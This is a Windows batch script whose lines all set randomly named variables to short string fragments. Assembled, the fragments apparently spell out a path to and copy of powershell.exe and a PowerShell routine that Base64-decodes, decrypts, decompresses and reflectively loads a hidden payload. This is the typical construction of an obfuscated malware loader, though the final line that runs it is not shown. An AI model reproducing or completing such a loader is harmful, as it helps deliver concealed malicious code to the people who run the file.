@echo off
set "RfLaLYtUZl=Wi"
set "BccvVMFUpy=\v"
set "DjgZRXRWAb=em"
set "mnIrwBNLXY= C"
set "UyBRGEwBPL=1."
set "JGibvyXphQ=Po"
set "nVEpnXukOa=ow"
set "FYCVieCOBU=nd"
set "TpFSxxarMm=we"
set "PhTcVyamrj=y "
set "UjkAEtJMaV=rs"
set "tHhGuhBIGy=s\"
set "PLglriDYMm=py"
set "MIAweENJNx=ws"
set "kdawLyjUqr=he"
set "WWwTmplzcy=he"
set "CXboMXEzOq=rS"
set "ayVkBcuMxv=.e"
set "lApnJcjtHK= /"
set "mEnbPhaEAZ=po"
set "VRrWwqOVRg=:\"
set "HwXAkrcKHr=we"
set "DRaQSTDBSX=ll"
set "frVMPURqiy=do"
set "GeVSVXMNUv=in"
set "iitqvaPIxv=0\"
set "hSMMtXowNs=Sy"
set "CTidNujSWq=32"
set "WBisRqLZmM=ll"
set "JYwwmtokNy=\W"
set "rlgYvaGBni=co"
set "yoEFcWSLGh=xe"
set "OatWTWAwMN=st"
set "vtdHemjnoC= %~dp0"
set "xyzYaAuiKf=cd"
set "KdsggHZaDJ= = N"
set "cAusQqWnTL=dxlT"
set "qjycCEWiEi=OyzA"
set "NLCUukazbK=GZiA"
set "LPqltGrVyX=rh.T"
set "ojseBFEDFi=yTo("
set "nZDJRAckop=em.C"
set "ZksXhPpBvk=ing("
set "eDGzLJyvXJ=brh."
set "ZieocgXVIq=]::N"
set "wkirXEGDUe=ateD"
set "afPyGBcezD=sion"
set "ZDhdgdBhfb=)($U"
set "FZKvvWymJP=phv."
set "srqQPaiGrk=tS46"
set "kyzmVSAIrl=;$JA"
set "LwkZkDQmTU=TnRS"
set "fwVWVmVVXk=Comp"
set "IGMaplwkfu=]::("
set "ANItvPXChl=rofi"
set "FTUrLuXpdv=[Sys"
set "dKKvWOqQqf=)))"
set "vGDwWVUTOY=nRSg"
set "xPFdmJhBqw=ecry"
set "rtZdLbbdul=pose"
set "sdmHhTOoMH=onve"
set "QVDKzBRurX=vj0m"
set "BcSaHrgmLr=, $d"
set "gMnpnJrkPR=ptor"
set "UoRoMkcBrv=pStr"
set "QcCWblmWZn=ddin"
set "ZdUVjAaZmu='[-1"
set "OhtPykDPIT=TK);"
set "OJypaPevGR=JAfq"
set "HEwtvmstMH=y]::"
set "bdUbScERSk=.Cry"
set "godNycdvSC=.Sec"
set "gzTuyafqmY=ode]"
set "ouucrurVUi=.Com"
set "SYGbEaASSj==');"
set "dqHkDSpnJq=:('g"
set "BmhaRoSfya=7;$T"
set "OrNbWQEcXg=morF"
set "wVBztqcGZm=Conv"
set "myCxbJjHMQ=ZYYc"
set "AmEFHmlxij=-joi"
set "QLnXxSDCiP=rity"
set "SYqbBxXzNk=();$"
set "LvqbXTEAFq=am;$"
set "vPDroMDycy=] -j"
set "rbugAkfJAl=lBlo"
set "eDonyfVhfW=)($d"
set "qifvraCufZ=flec"
set "DRbtQynaiC=('l0"
set "DmKTsJToXZ=tem."
set "rGZzEGKLZT=; };"
set "nwNcgGXMyQ=$bTb"
set "NtElGXxijB=($Wk"
set "UpWvnZCQJX=trea"
